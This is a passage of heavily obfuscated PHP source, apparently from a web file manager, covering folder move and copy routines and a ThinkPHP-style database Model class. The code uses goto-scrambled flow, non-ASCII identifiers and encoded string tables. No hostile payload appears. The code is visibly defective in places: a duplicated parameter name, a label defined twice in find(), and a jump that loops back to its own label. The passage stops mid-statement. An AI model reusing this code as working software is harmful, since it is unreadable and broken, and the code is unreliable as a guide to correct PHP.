$cӄ砷 =& $_SERVER[̉]; $d = $this->sourceInfo($f); $dМ = $this->sourceInfo($B); goto A撉; Bܭö: if (!$d || !$dМ || $dМ[$cӄ砷[403]] != $cӄ砷[87]) { return !1; } Hook::trigger($cӄ砷[558], $e); $this->targetIsDelete = intval($d[$cӄ砷[423]]); goto Eŧ; a: $this->folderSizeReset($B); $Dߑ = array($d[$cӄ砷[478]], $B); if ($d[$cӄ砷[403]] == $cӄ砷[87]) { $Dߑ[] = $f; } goto a; Bу: $this->lockMoveEnd($f); $this->lockWriteEnd($B, $c߸); $this->folderSizeReset($d[$cӄ砷[478]]); goto a; A撉: if ($d[$cӄ砷[478]] == $dМ[$cӄ砷[395]]) { if ($d[$cӄ砷[423]] == $cӄ砷[87]) { Model($cӄ砷[421])->restore(array($f)); } if (!$e˹ || $e˹ == $d[$cӄ砷[28]]) { return $f; } } $e = $this->pathInfoMore($f); if ($this->isParentOf($f, $B)) { return !1; } goto Bܭö; B㎸: } private function _move($cٶҏ, $C, $Bѻ, &$Dޒ, $aֽ = '') { goto D߻; F߂: $aё = $aֽ ? $aֽ : $a[$Eɧ[28]]; $d׆槡 = $this->fileNameExistCache($C, $aё); $this->lockMoveStart($cٶҏ); goto e·; D߻: $Eɧ =& $_SERVER[̉]; $a = $this->sourceInfo($cٶҏ); $Eϓ = $a[$Eɧ[403]] == $Eɧ[87]; goto F߂; e·: $this->lockWriteStart($C, $aё); if (!$d׆槡) { return $this->_moveForce($cٶҏ, $C, $aё); } $eƌ = $d׆槡; goto f⭃Ȣ; f⭃Ȣ: $eȐ٨ = !1; if ($Eϓ) { if ($Bѻ == REPEAT_RENAME_FOLDER) { $aё = $this->fileNameAuto($C, $aё, $Bѻ, $Eϓ); $eƌ = $this->_moveForce($cٶҏ, $C, $aё); } else { if ($Bѻ == REPEAT_RENAME_FOLDER) { $Bѻ = REPEAT_RENAME; } $Bז΋ = $this->_childrenListSelect($cٶҏ); foreach ($Bז΋ as $A᝜) { $this->_move($A᝜[$Eɧ[395]], $d׆槡, $Bѻ, $Dޒ); } $eȐ٨ = !0; } } else { if ($Bѻ == REPEAT_SKIP) { $eȐ٨ = !0; } else { if ($Bѻ == REPEAT_RENAME || $Bѻ == REPEAT_RENAME_FOLDER) { $aё = $this->fileNameAuto($C, $aё, $Bѻ, $Eϓ); $eƌ = $this->_moveForce($cٶҏ, $C, $aё); } else { if ($Bѻ == REPEAT_REPLACE) { $cʃԛ = $this->sourceInfoCache($d׆槡); $b㒜 = $this->fileHistory($cʃԛ, $a[$Eɧ[447]], $a[$Eɧ[78]]); if ($b㒜) { $Dޒ[$Eɧ[529]][] = $a[$Eɧ[447]]; } else { $eȐ٨ = !0; } } } } } if ($eȐ٨ && !$Dޒ[$Eɧ[560]]) { $Dޒ[$Eɧ[560]] = !0; } goto cë; cë: return $eƌ; goto aԯ; aԯ: } private function _moveForce($fǮ؈, $B, $C׌) { goto A򖜪; dרϝ: $E¬ = $aጪ[$F[403]] == $F[87]; $B̑ = array($F[394] => $C[$F[395]], $F[553] => $C[$F[487]] . $C[$F[395]] . $F[47], $F[549] => $C[$F[404]], $F[550] => $C[$F[484]], $F[552] => USER_ID, $F[413] => $C׌); $c = $aጪ[$F[404]] == SourceModel::TYPE_GROUP && $C[$F[404]] == SourceModel::TYPE_GROUP && $aጪ[$F[484]] == $C[$F[484]]; goto aղ; aղ: if (!$c && $this->moveClearAuth) { Model($F[482])->authClear($fǮ؈); } $B̋ = $aጪ[$F[423]] == $F[87] && $C[$F[423]] != $F[87]; if ($B̋) { $B̑[$F[422]] = 0; } goto fĴ; A򖜪: $F =& $_SERVER[̉]; $aጪ = $this->sourceInfo($fǮ؈); $C = $this->sourceInfo($B); goto dרϝ; fĴ: if ($E¬) { $FƊ = array($F[553] => array($F[512], $aጪ[$F[487]] . $aጪ[$F[395]] . $F[513])); $a΂ = $aጪ[$F[487]] . $aጪ[$F[395]] . $F[47]; $a՜ = $C[$F[487]] . $C[$F[395]] . $F[47] . $aጪ[$F[395]] . $F[47]; $Dҷ׍ = array($F[553] => array($F[561], "\x72\x65\160\154\141\143\x65\x28\x70\x61\162\x65\x6e\x74\x4c\x65\166\x65\x6c\54\x27{$a΂}\x27\54\47{$a՜}\x27\51"), $F[549] => $C[$F[404]], $F[550] => $C[$F[484]]); if ($B̋) { $Dҷ׍[$F[422]] = 0; } $this->where($FƊ)->data($Dҷ׍)->save(); } $this->where(array($F[410] => $fǮ؈))->data($B̑)->save(); return $fǮ؈; goto B; B: } private function clearShare($DՉȟ, $Aԇ) { goto d哮ئ; d哮ئ: $d݆ =& $_SERVER[̉]; $fܞ = $this->sourceInfo($DՉȟ); $f = $this->sourceInfo($Aԇ); goto C쿖٫; C쿖٫: if ($fܞ[$d݆[484]] == $f[$d݆[484]] && $fܞ[$d݆[404]] == $d݆[562]) { return; } $c͈ = array($d݆[487] => array($d݆[512], $fܞ[$d݆[487]] . $DՉȟ . $d݆[513])); $fŐ = $this->field($d݆[410])->where($c͈)->getField($d݆[395], !0); goto F; b: Model($d݆[563])->where($c͈)->save(array($d݆[475] => 0)); Model($d݆[564])->where($c͈)->delete(); goto eɧ; aę: if (!$f݆) { return; } $f݆ = array_to_keyvalue($f݆, $d݆[33], $d݆[468]); $c͈ = array($d݆[468] => array($d݆[7], $f݆)); goto b; F: if (!$fŐ) { return; } $c͈ = array($d݆[395] => array($d݆[7], $fŐ), $d݆[475] => 1); $f݆ = Model($d݆[563])->field($d݆[468])->where($c͈)->select(); goto aę; eɧ: } public function copyFolderFromIO($D貛, $dҹ, $bɘۄ, $Bԩ, $F, $e = false) { goto aʹ۲; dצ: $d䏮 = $this->fileNameExist($bɘۄ, $b); $Eȑ = $this->mkdir($bɘۄ, $b, $Bԩ); if (!$d䏮 || $Bԩ == REPEAT_RENAME_FOLDER) { $Bԩ = !1; } goto EŻ; aʹ۲: $a򂸮 =& $_SERVER[̉]; $Eƚ揚 = array($a򂸮[530] => array(), $a򂸮[531] => array(), $a򂸮[529] => array(), $a򂸮[565] => array()); $b = $e ? $e : $D貛->pathThis($dҹ); goto dצ; EŻ: if ($d䏮) { $this->_childrenAllMake($d䏮); } Hook::trigger($a򂸮[566]); $this->_copyChildTo($D貛, $dҹ, $Eȑ, $Bԩ, $Eƚ揚, $F); goto A; A: Hook::trigger($a򂸮[567]); if ($Eȑ) { $this->folderSizeResetChildren($Eȑ); } $this->_childrenListClear(); goto b؞; b؞: Model($a򂸮[532])->addAll($Eƚ揚[$a򂸮[530]], array(), !0); Model($a򂸮[533])->eventCopy($Eȑ); $this->saveAll($Eƚ揚[$a򂸮[531]]); goto b͆ƭ; bᜎݪ: $this->updateModifyTime($bɘۄ); return $Eȑ; goto cҪ; b͆ƭ: Model($a򂸮[450])->linkAdd($Eƚ揚[$a򂸮[529]]); Model($a򂸮[450])->remove($Eƚ揚[$a򂸮[565]]); $this->folderSizeReset($bɘۄ); goto bᜎݪ; cҪ: } private function _copyChildTo($B, $fω, $B, $C, &$f, $f˖) { goto a; F׎: $A˵ѩ = array(); foreach ($Aۼ as &$B) { goto e; e: if (isset($E[$B[$Cϕ[28]]])) { $B = $E[$B[$Cϕ[28]]]; } $B[$Cϕ[403]] = $B[$Cϕ[29]] == $Cϕ[77]; $B[$Cϕ[405]] = _get($B, $Cϕ[168], $Cϕ[33]); goto EΧ; EΧ: $B[$Cϕ[78]] = _get($B, $Cϕ[78], 0); $B[$Cϕ[447]] = _get($B, $Cϕ[447], 0); if (!isset($B[$Cϕ[568]]) && $B[$Cϕ[447]]) { $f[$Cϕ[565]][] = $B[$Cϕ[447]]; } goto CҌ; CҌ: if ($C) { $fȽ = $this->fileNameExistCache($B, $B[$Cϕ[28]]); if ($fȽ) { if ($B[$Cϕ[403]] || $C == REPEAT_SKIP) { continue; } if ($C == REPEAT_REPLACE) { $DϪ = $this->sourceInfoCache($fȽ); $c = $this->fileHistory($DϪ, $B[$Cϕ[447]], $B[$Cϕ[78]]); if ($c) { $f[$Cϕ[529]][] = $B[$Cϕ[447]]; } continue; } else { if ($C == REPEAT_RENAME) { $B[$Cϕ[28]] = $this->fileNameAutoCache($B, $B[$Cϕ[28]], $C, !1); } } } } if (!$B[$Cϕ[403]] && $B[$Cϕ[447]]) { $f[$Cϕ[529]][] = $B[$Cϕ[447]]; } $A˵ѩ[] = $this->_makeItemData($B, $b, $B[$Cϕ[28]]); goto B㽏; B㽏: } unset($B); goto FǑ; FǑ: if (!empty($A˵ѩ)) { $this->addAll($A˵ѩ); $this->_childrenListSelect($B); } $fԵي = $this->_childrenList($B); $fԵي = array_to_keyvalue($fԵي, $Cϕ[28]); goto B; B: foreach ($Aۼ as $B) { $DϪ = $fԵي[$B[$Cϕ[28]]]; $DâЪ = $DϪ[$Cϕ[395]]; $this->_copyApplyMeta($DϪ, $f); if ($B[$Cϕ[29]] == $Cϕ[77]) { $B[$Cϕ[76]] = $B->getPathInner($B[$Cϕ[76]]); $this->_copyChildTo($B, $B[$Cϕ[76]], $DâЪ, $C, $f, $f˖); } } goto d; Dم: $CǛ = $CǛ ? $CǛ : array($Cϕ[74] => array(), $Cϕ[75] => array()); $Aۼ = array_merge($CǛ[$Cϕ[74]], $CǛ[$Cϕ[75]]); $E = $this->_addFiles($B, $CǛ[$Cϕ[74]], $f˖); goto F׎; a: $Cϕ =& $_SERVER[̉]; $b = $this->sourceInfoCache($B); $CǛ = $B->listPath($fω); goto Dم; d: } private function _addFiles($A, $E̸, $A߇׍) { goto aƤ; e򺪖: foreach ($E̸ as $Dͧ) { $A[$Dͧ[$cܖ[28]]] = $Dͧ; } return $A; goto f⨞; aƤ: $cܖ =& $_SERVER[̉]; if (!$E̸ || count($E̸) == 0) { return array(); } $c͖ = array(); goto F֪; f펕: $Eґ = Model($cܖ[571]); $C = $Eґ->where($fƘ荮)->select(); $C = $C ? $C : array(); goto CѴ; F֪: foreach ($E̸ as &$Aݪ) { goto fĵ; fё: if (count($c͖[$B]) > 1) { $Aݪ[$cܖ[568]] = !0; } goto c֢; A: $B = $A->hashMd5($Aݪ[$cܖ[76]]); if (strlen($B) > 10 && !isset($c͖[$B])) { $c͖[$B] = array(); } $Aݪ[$cܖ[171]] = $a͔ĺ; goto E㒕; E㒕: $Aݪ[$cܖ[170]] = $B; Hook::trigger($cܖ[570], $Aݪ); $c͖[$B][] =& $Aݪ; goto fё; fĵ: Hook::trigger($cܖ[569], $Aݪ); $Aݪ[$cܖ[76]] = $A->getPathInner($Aݪ[$cܖ[76]]); $a͔ĺ = $A->hashSimple($Aݪ[$cܖ[76]]); goto A; c֢: } unset($Aݪ); $fƘ荮 = array($cܖ[170] => array($cܖ[7], array_keys($c͖))); goto f펕; CѴ: foreach ($C as $fڭ۽) { if (!isset($c͖[$fڭ۽[$cܖ[170]]])) { continue; } $c = $c͖[$fڭ۽[$cܖ[170]]]; foreach ($c as &$Aݪ) { $Aݪ[$cܖ[447]] = $fڭ۽[$cܖ[447]]; $Aݪ[$cܖ[568]] = !0; } unset($Aݪ); } $F = array(); foreach ($E̸ as $d·) { if (isset($d·[$cܖ[568]]) && $d·[$cܖ[568]]) { continue; } $c۔ = $A->getPathInner($d·[$cܖ[76]]); $eц = $Eґ->addFileMake($c۔, $d·[$cܖ[78]], $d·[$cܖ[171]], $d·[$cܖ[170]], $d·[$cܖ[28]], $A߇׍); $F[] = $eц; } goto eĹ; d׷: $C = $C ? $C : array(); foreach ($C as $fڭ۽) { if (!isset($c͖[$fڭ۽[$cܖ[170]]])) { continue; } $F =& $c͖[$fڭ۽[$cܖ[170]]]; foreach ($F as &$Aݪ) { $Aݪ[$cܖ[447]] = $fڭ۽[$cܖ[447]]; } unset($Aݪ); } $A = array(); goto e򺪖; eĹ: $Eґ->addAll($F); $fƘ荮 = array($cܖ[170] => array($cܖ[7], array_keys($c͖))); $C = $Eґ->where($fƘ荮)->select(); goto d׷; f⨞: } } define($_SERVER[̉][572], $_SERVER[̉][573]); goto d۸ݨ; Fܿ֎: define($_SERVER[̉][240], 0); define($_SERVER[̉][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\157\x72\144\145\162", "\141\x6c\151\141\163", "\150\141\166\151\x6e\x67", "\x67\x72\x6f\165\x70", "\x6c\x6f\x63\x6b", "\x64\x69\163\164\151\156\143\164", "\141\165\164\157", "\146\151\154\164\x65\162", "\166\141\x6c\151\x64\141\164\x65", "\162\145\x73\165\154\x74", "\x62\x69\x6e\x64", "\x74\157\x6b\145\x6e"); public function __construct($E輦 = '', $F貘 = '', $F = '') { $Eܙ =& $_SERVER[̉]; $this->_initialize(); if (!empty($E輦)) { if (strpos($E輦, $Eܙ[95])) { list($this->dbName, $this->name) = explode($Eܙ[95], $E輦); } else { $this->name = $E輦; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F貘)) { $this->tablePrefix = $Eܙ[33]; } elseif ($Eܙ[33] != $F貘) { $this->tablePrefix = $F貘; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Eܙ[242]); } $this->db(0, empty($this->connection) ? $F : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $d =& $_SERVER[̉]; if (empty($this->fields)) { if (think_config($d[243])) { $dщߛ = $this->dbName ? $this->dbName : think_config($d[244]); $F = think_var_cache($d[245] . strtolower(get_path_this($dщߛ) . $d[95] . $this->name)); if ($F) { $BϷ㐨 = think_config($d[246]); if (empty($BϷ㐨) || $F[$d[247]] == $BϷ㐨) { $this->fields = $F; return; } } } $this->flush(); } } public function flush() { goto bғ; Dۖۨڔ: if (think_config($Dڧ[243])) { $FŔԍ = $this->dbName ? $this->dbName : think_config($Dڧ[244]); think_var_cache($Dڧ[245] . strtolower(get_path_this($FŔԍ) . $Dڧ[95] . $this->name), $this->fields); } goto aϙٞ; Fǂ: if (!$Eɑ) { return !1; } $this->fields = array_keys($Eɑ); $this->fields[$Dڧ[248]] = !1; goto a׉; bғ: $Dڧ =& $_SERVER[̉]; $this->db->setModel($this->name); $Eɑ = $this->db->getFields($this->getTableName()); goto Fǂ; a׉: foreach ($Eɑ as $Aݟ΂ => $fڢ) { $fԧ[$Aݟ΂] = $fڢ[$Dڧ[29]]; if ($fڢ[$Dڧ[36]]) { $this->fields[$Dڧ[249]] = $Aݟ΂; if ($fڢ[$Dڧ[39]]) { $this->fields[$Dڧ[248]] = !0; } } } $this->fields[$Dڧ[250]] = $fԧ; if (think_config($Dڧ[246])) { $this->fields[$Dڧ[247]] = think_config($Dڧ[246]); } goto Dۖۨڔ; aϙٞ: } public function switchModel($dʠ, $c菧 = array()) { $cЗ䌵 =& $_SERVER[̉]; $B﹄ = ucwords(strtolower($dʠ)) . $cЗ䌵[251]; if (!class_exists($B﹄)) { think_exception($B﹄ . think_lang($cЗ䌵[252])); } $this->_extModel = new $B﹄($this->name); if (!empty($c菧)) { foreach ($c菧 as $DՏ) { $this->_extModel->setProperty($DՏ, $this->{$DՏ}); } } return $this->_extModel; } public function __set($fʔ, $Eяߡ) { $this->data[$fʔ] = $Eяߡ; } public function __get($A䄋) { return isset($this->data[$A䄋]) ? $this->data[$A䄋] : null; } public function __isset($BҔ) { return isset($this->data[$BҔ]); } public function __unset($Cœ) { unset($this->data[$Cœ]); } public function __call($B׈, $E쏥) { $Cڥï =& $_SERVER[̉]; if (in_array(strtolower($B׈), $this->methods, !0)) { $this->options[strtolower($B׈)] = $E쏥[0]; return $this; } elseif (in_array(strtolower($B׈), array($Cڥï[253], $Cڥï[254], $Cڥï[255], $Cڥï[256], $Cڥï[257]), !0)) { $B = isset($E쏥[0]) ? $E쏥[0] : $Cڥï[182]; $B = $this->db->parseKey($B); return $this->getField(strtoupper($B׈) . $Cڥï[258] . $B . $Cڥï[259] . $B׈, $Cڥï[253]); } elseif (strtolower(substr($B׈, 0, 5)) == $Cڥï[260]) { $B = think_parse_name(substr($B׈, 5)); $c[$B] = $E쏥[0]; return $this->where($c)->find(); } elseif (strtolower(substr($B׈, 0, 10)) == $Cڥï[261]) { $a醟 = think_parse_name(substr($B׈, 10)); $c[$a醟] = $E쏥[0]; return $this->where($c)->getField($E쏥[1]); } elseif (isset($this->_scope[$B׈])) { return $this->scope($B׈, $E쏥[0]); } elseif (method_exists($this, $B׈)) { array_unshift($E쏥, $B׈); return call_user_func_array(array($this, $Cڥï[262]), $E쏥); } else { return call_user_func_array(array(parent, $B׈), $E쏥); } } protected function call() { goto Dգٹ; e殩: $aÖϻ = $bښ; if (is_array($bښ)) { $aÖϻ = $bښ[1]; $bښ = $bښ[0]; } $fʬ҆ = count($b؃) - 1; goto c; c: if (isset($b؃[$fʬ҆]) && $b؃[$fʬ҆] === $bښ) { think_exception(__CLASS__ . $E̊[4] . $bښ . think_lang($E̊[263])); return; } $b؃[] = $bښ; if (method_exists($this, $E̊[264])) { $F¹ = call_user_func_array(array($this, $E̊[265]), array($aÖϻ, $b؃)); if (!is_null($F¹) && $F¹ !== !1) { return $F¹; } } goto b҄ͮ; b҄ͮ: $DΘ = call_user_func_array(array($this, $bښ), $b؃); if (method_exists($this, $E̊[266])) { $F¹ = call_user_func_array(array($this, $E̊[267]), array($aÖϻ, $b؃, $DΘ)); if ($F¹) { return $F¹; } } return $DΘ; goto C; Dգٹ: $E̊ =& $_SERVER[̉]; $b؃ = func_get_args(); $bښ = array_shift($b؃); goto e殩; C: } protected function _initialize() { } protected function _facade($d) { $E =& $_SERVER[̉]; if (!empty($this->fields)) { foreach ($d as $D => $Cܗ) { if (is_array($this->fields) && !in_array($D, $this->fields, !0)) { unset($d[$D]); } elseif (is_scalar($Cܗ)) { $this->_parseType($d, $D); } } } if (!empty($this->options[$E[268]])) { $d = array_map($this->options[$E[268]], $d); unset($this->options[$E[268]]); } $this->_beforeWrite($d); return $d; } protected function _beforeWrite(&$D) { } public function add($Dڌ = '', $BӶ = array(), $D = false) { goto aι␈; aι␈: if (empty($Dڌ)) { if (!empty($this->data)) { $Dڌ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[̉][269]); return !1; } } $BӶ = $this->_parseOptions($BӶ); $Dڌ = $this->_facade($Dڌ); goto bӃ; bӃ: if (!1 === $this->_beforeInsert($Dڌ, $BӶ)) { return !1; } $F؊ = $this->db->insert($Dڌ, $BӶ, $D); if (!1 !== $F؊) { $cܨ = $this->getLastInsID(); if ($cܨ) { $Dڌ[$this->getPk()] = $cܨ; $this->_after_insert($Dڌ, $BӶ); return $cܨ; } $this->_after_insert($Dڌ, $BӶ); } goto E; E: return $F؊; goto F; F: } protected function _beforeInsert(&$bҨ, $eݝ葛) { } protected function _after_insert($b⟓, $c) { } public function addAll($a, $c = array(), $e࣋ = false) { goto c⻯; C匢: return $A; goto dяä֑; c⻯: $Dꬻ =& $_SERVER[̉]; if (empty($a)) { $this->error = think_lang($Dꬻ[269]); return !1; } $c = $this->_parseOptions($c); goto f; f: foreach ($a as $Cɧڮ => $B㊠ŭ) { $a[$Cɧڮ] = $this->_facade($B㊠ŭ); } if (method_exists($this->db, $Dꬻ[270])) { $A = $this->db->insertAll($a, $c, $e࣋); } else { $this->startTrans(); foreach ($a as $Cɧڮ => $B㊠ŭ) { $A = $this->db->insert($B㊠ŭ, $c, $e࣋); } $this->commit(); } if (!1 !== $A) { $dҴ׳ӈ = $this->getLastInsID(); if ($dҴ׳ӈ) { return $dҴ׳ӈ; } } goto C匢; dяä֑: } public function selectAdd($A = '', $AŶ = '', $bў = array()) { $Cʛ =& $_SERVER[̉]; $bў = $this->_parseOptions($bў); if (!1 === ($C = $this->db->selectInsert($A ? $A : $bў[$Cʛ[271]], $AŶ ? $AŶ : $this->getTableName(), $bў))) { $this->error = think_lang($Cʛ[272]); return !1; } else { return $C; } } public function save($A = '', $aʲ = array()) { goto A䦨; bӏ: $aʲ = $this->_parseOptions($aʲ); $Cأˉ = $this->getPk(); if (!isset($aʲ[$DΔ[273]])) { if (isset($A[$Cأˉ])) { $Aћ[$Cأˉ] = $A[$Cأˉ]; $aʲ[$DΔ[273]] = $Aћ; unset($A[$Cأˉ]); } else { $this->error = think_lang($DΔ[272]); return !1; } } goto Bӄ; Bӄ: if (is_array($aʲ[$DΔ[273]]) && isset($aʲ[$DΔ[273]][$Cأˉ])) { $D˿ = $aʲ[$DΔ[273]][$Cأˉ]; } if (!1 === $this->_beforeUpdate($A, $aʲ)) { return !1; } $E˰ۻ = $this->db->update($A, $aʲ); goto B˨; B˨: if (!1 !== $E˰ۻ) { if (isset($D˿)) { $A[$Cأˉ] = $D˿; } $this->_afterUpdate($A, $aʲ); } return $E˰ۻ; goto FǹӅ; A䦨: $DΔ =& $_SERVER[̉]; if (empty($A)) { if (!empty($this->data)) { $A = $this->data; $this->data = array(); } else { $this->error = think_lang($DΔ[269]); return !1; } } $A = $this->_facade($A); goto bӏ; FǹӅ: } protected function _beforeUpdate(&$AϷ㪟, $dɞ) { } protected function _afterUpdate($fį, $fä) { } public function delete($d⍾ = array()) { goto cȈ݅; c: if (is_numeric($d⍾) || is_string($d⍾)) { if (strpos($d⍾, $D[47])) { $aҐ[$d] = array($D[274], $d⍾); } else { $aҐ[$d] = $d⍾; } $this->options[$D[273]] = $aҐ; } $d⍾ = $this->_parseOptions(); if (is_array($d⍾[$D[273]]) && isset($d⍾[$D[273]][$d])) { $Aܥ = $d⍾[$D[273]][$d]; } goto E͋; cȈ݅: $D =& $_SERVER[̉]; if (empty($d⍾) && empty($this->options[$D[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $d = $this->getPk(); goto c; E͋: $f䃨 = $this->db->delete($d⍾); if (!1 !== $f䃨) { $b = array(); if (isset($Aܥ)) { $b[$d] = $Aܥ; } $this->_after_delete($b, $d⍾); } return $f䃨; goto Bݎ; Bݎ: } protected function _after_delete($Aíǎ, $F) { } public function select($B = array()) { goto Eԝ; a͐¥: $C = $this->db->select($B); if (!1 === $C) { return !1; } if (empty($C)) { return null; } goto cƍ; Eԝ: $a߇ =& $_SERVER[̉]; if (is_string($B) || is_numeric($B)) { $aҎ = $this->getPk(); if (strpos($B, $a߇[47])) { $B[$aҎ] = array($a߇[274], $B); } else { $B[$aҎ] = $B; } $this->options[$a߇[273]] = $B; } elseif (!1 === $B) { $B = $this->_parseOptions(); return $a߇[275] . $this->db->buildSelectSql($B) . $a߇[276]; } $B = $this->_parseOptions(); goto a͐¥; cƍ: $this->_afterSelect($C, $B); return $C; goto Aޝ; Aޝ: } protected function _afterSelect(&$d, $eꥹ) { } public function buildSql($eݠꖽ = array()) { $CҺ =& $_SERVER[̉]; $eݠꖽ = $this->_parseOptions($eݠꖽ); return $CҺ[275] . $this->db->buildSelectSql($eݠꖽ) . $CҺ[276]; } public function optionsValue($CÔӄ = null) { if (is_null($CÔӄ)) { return $this->options; } elseif (is_array($CÔӄ)) { $this->options = array_merge($this->options, $CÔӄ); } } protected function _parseOptions($B믷× = array()) { goto DǰΫ; DǰΫ: $eʪ =& $_SERVER[̉]; if (is_array($B믷×)) { $B믷× = array_merge($this->options, $B믷×); } $this->options = array(); goto Aʠ; Aʠ: if (!isset($B믷×[$eʪ[277]])) { $B믷×[$eʪ[277]] = $this->getTableName(); $FÏ = $this->fields; } else { $FÏ = $this->getDbFields(); } if (!empty($B믷×[$eʪ[278]])) { $B믷×[$eʪ[277]] .= $eʪ[50] . $B믷×[$eʪ[278]]; } $B믷×[$eʪ[279]] = $this->name; goto F; F: if (isset($B믷×[$eʪ[273]]) && is_array($B믷×[$eʪ[273]]) && !empty($FÏ) && !isset($B믷×[$eʪ[280]]) && !isset($B믷×[$eʪ[277]])) { foreach ($B믷×[$eʪ[273]] as $F۾ => $Aٿޜ) { $F۾ = trim($F۾); if (in_array($F۾, $FÏ, !0)) { if (is_scalar($Aٿޜ)) { $this->_parseType($B믷×[$eʪ[273]], $F۾); } } elseif (!is_numeric($F۾) && $eʪ[71] != substr($F۾, 0, 1) && !1 === strpos($F۾, $eʪ[95]) && !1 === strpos($F۾, $eʪ[258]) && !1 === strpos($F۾, $eʪ[281]) && !1 === strpos($F۾, $eʪ[282])) { unset($B믷×[$eʪ[273]][$F۾]); } } } $this->_options_filter($B믷×); return $B믷×; goto f; f: } protected function _options_filter(&$a) { } protected function _parseType(&$A֜ˠ, $A񽅗) { $e݂ =& $_SERVER[̉]; if (empty($this->options[$e݂[283]][$e݂[4] . $A񽅗])) { $bږ = strtolower($this->fields[$e݂[250]][$A񽅗]); if (!1 !== strpos($bږ, $e݂[284])) { } elseif (!1 === strpos($bږ, $e݂[285]) && !1 !== strpos($bږ, $e݂[286])) { $A֜ˠ[$A񽅗] = intval($A֜ˠ[$A񽅗]); } elseif (!1 !== strpos($bږ, $e݂[287]) || !1 !== strpos($bږ, $e݂[288])) { $A֜ˠ[$A񽅗] = floatval($A֜ˠ[$A񽅗]); } elseif (!1 !== strpos($bږ, $e݂[289])) { $A֜ˠ[$A񽅗] = (bool) $A֜ˠ[$A񽅗]; } } } public function find($c܇ = array()) { goto D֒; D֒: $f֐ =& $_SERVER[̉]; if (is_numeric($c܇) || is_string($c܇)) { $A[$this->getPk()] = intval($c܇); $this->options[$f֐[273]] = $A; } $this->options[$f֐[290]] = 1; goto C՗; f: if (empty($F)) { return null; } $this->data = $F[0]; $this->_afterFind($this->data, $c܇); goto f; f: if (!empty($this->options[$f֐[291]])) { return $this->returnResult($this->data, $this->options[$f֐[291]]); } return $this->data; goto b; C՗: $c܇ = $this->_parseOptions(); $F = $this->db->select($c܇); if (!1 === $F) { return !1; } goto f; b: } protected function _afterFind(&$e, $F솇) { } protected function returnResult($Aԛƥ, $aۖ = '') { $A苣 =& $_SERVER[̉]; if ($aۖ) { if (is_callable($aۖ)) { return call_user_func($aۖ, $Aԛƥ); } switch (strtolower($aۖ)) { case $A苣[292]: return json_encode($Aԛƥ); case $A苣[293]: return xml_encode($Aԛƥ); } } return $Aԛƥ; } public function parseFieldsMap($eߩ, $F򏉘É = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Dއ => $cƐ) { if ($F򏉘É == 1) { if (isset($eߩ[$cƐ])) { $eߩ[$Dއ] = $eߩ[$cƐ]; unset($eߩ[$cƐ]); } } else { if (isset($eߩ[$Dއ])) { $eߩ[$cƐ] = $eߩ[$Dއ]; unset($eߩ[$Dއ]); } } } } return $eߩ; } public function setField($e҉, $d̞ = '') { if (is_array($e҉)) { $fנϓ = $e҉; } else { $fנϓ[$e҉] = $d̞; } return $this->save($fנϓ); } public function setAdd($F苈̪, $bӍ = 1) { $bף =& $_SERVER[̉]; $D񒗾 = $F苈̪ . $bף[294] . $bӍ; if ($bӍ < 0) { $D񒗾 = $F苈̪ . $bӍ; } return $this->setField($F苈̪, array($bף[295], $D񒗾)); } public function getField($BȊ, $D儛ٛ = null) { $dԂ𣧳 =& $_SERVER[̉]; $d֗[$dԂ𣧳[271]] = $BȊ; $d֗ = $this->_parseOptions($d֗); $BȊ = trim($BȊ); if (strpos($BȊ, $dԂ𣧳[47])) { if (!isset($d֗[$dԂ𣧳[290]])) { $d֗[$dԂ𣧳[290]] = is_numeric($D儛ٛ) ? $D儛ٛ : $dԂ𣧳[33]; } $F = $this->db->select($d֗); if (!empty($F)) { goto cĠ; b: foreach ($F as $Fˊ) { $Bت = $Fˊ[$bɌ¹]; if (2 == $d) { $C[$Bت] = $Fˊ[$A؟]; } else { $C[$Bت] = is_string($D儛ٛ) ? implode($D儛ٛ, $Fˊ) : $Fˊ; } } return $C; goto C񈘢; Dی՛: $A؟ = array_shift($BȊ); $C = array(); $d = count($EЙ); goto b; cĠ: $EЙ = explode($dԂ𣧳[47], $BȊ); $BȊ = array_keys($F[0]); $bɌ¹ = array_shift($BȊ); goto Dی՛; C񈘢: } } else { if (!0 !== $D儛ٛ) { $d֗[$dԂ𣧳[290]] = is_numeric($D儛ٛ) ? $D儛ٛ : 1; } if ($D儛ٛ === $dԂ𣧳[253]) { unset($d֗[$dԂ𣧳[290]]); } $Fˊ = $this->db->select($d֗); if (!empty($Fˊ)) { if ($D儛ٛ === $dԂ𣧳[253]) { return reset($Fˊ[0]); } if (!0 !== $D儛ٛ && 1 == $d֗[$dԂ𣧳[290]]) { return reset($Fˊ[0]); } foreach ($Fˊ as $Dԋ) { $f徟[] = $Dԋ[$BȊ]; } return $f徟; } } return null; } public function create($Bᄣ = '', $C = '') { goto Bݠ; Bݠ: $Fе˂ =& $_SERVER[̉]; if (empty($Bᄣ)) { $Bᄣ = $_POST; } elseif (is_object($Bᄣ)) { $Bᄣ = get_object_vars($Bᄣ); } if (empty($Bᄣ) || !is_array($Bᄣ)) { $this->error = think_lang($Fе˂[269]); return !1; } goto eꈅ; A䫣: return $Bᄣ; goto E델γ; eꈅ: $Bᄣ = $this->parseFieldsMap($Bᄣ, 0); $C = $C ? $C : (!empty($Bᄣ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Fе˂[271]])) { $bٶ = $this->options[$Fе˂[271]]; unset($this->options[$Fе˂[271]]); } elseif ($C == THINK_MODEL_INSERT && isset($this->insertFields)) { $bٶ = $this->insertFields; } elseif ($C == THINK_MODEL_UPDATE && isset($this->updateFields)) { $bٶ = $this->updateFields; } goto eɻ颯; DÆ: if 